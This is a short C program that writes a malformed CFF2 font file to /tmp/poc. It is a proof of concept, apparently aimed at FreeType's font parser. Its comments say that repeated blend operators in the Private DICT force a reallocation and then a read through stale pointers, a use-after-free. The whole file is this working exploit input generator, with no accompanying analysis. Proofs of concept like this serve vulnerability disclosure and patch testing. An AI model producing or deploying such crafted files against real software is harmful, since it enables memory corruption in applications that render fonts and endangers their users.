#include <stdio.h>
#include <stdint.h>

int main(void)
{
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* CFF2 Header: major=2, minor=0, hdrSize=4, topDictSize=19 */
    fputc(0x02, f); fputc(0x00, f); fputc(0x04, f); fputc(0x13, f);

    /* Top DICT (19 bytes) */
    /* vsindex: push 5, operator 0x16 */
    fputc(0x05, f); fputc(0x16, f);
    /* CharStrings: offset=23 (0x17) */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x17, f);
    fputc(0x11, f);
    /* Private: size=128, offset=31 (0x1F) */
    fputc(0x1C, f); fputc(0x00, f); fputc(0x80, f);
    fputc(0x1C, f); fputc(0x00, f); fputc(0x1F, f);
    fputc(0x12, f);
    /* Pad to 19 bytes: 13 bytes written, need 6 more */
    for (int i = 0; i < 6; i++) fputc(0x00, f);

    /* Global Subr INDEX: count=0 */
    fputc(0x00, f); fputc(0x00, f);

    /* CharStrings INDEX: count=1, offSize=1, off[0]=1, off[1]=2, data=endchar */
    fputc(0x00, f); fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x01, f);
    fputc(0x02, f);
    fputc(0x0E, f);

    /* Private DICT at offset 31 */
    /* First blend: numBlends=2, numAxes=5 => 12 values + 10 designs */
    for (int i = 0; i < 12; i++) fputc(0x8B, f);
    for (int i = 0; i < 10; i++) fputc(0x8B, f);
    fputc(0x02, f); fputc(0x17, f);

    /* Second blend: triggers FT_REALLOC */
    for (int i = 0; i < 12; i++) fputc(0x8B, f);
    for (int i = 0; i < 10; i++) fputc(0x8B, f);
    fputc(0x02, f); fputc(0x17, f);

    /* Third blend: reads stale pointers */
    for (int i = 0; i < 12; i++) fputc(0x8B, f);
    for (int i = 0; i < 10; i++) fputc(0x8B, f);
    fputc(0x02, f); fputc(0x17, f);

    /* Pad Private DICT to 128 bytes from offset 31 */
    long pos = ftell(f);
    long target = 31 + 128;
    for (long i = pos; i < target; i++)
        fputc(0x00, f);

    fclose(f);
    return 0;
}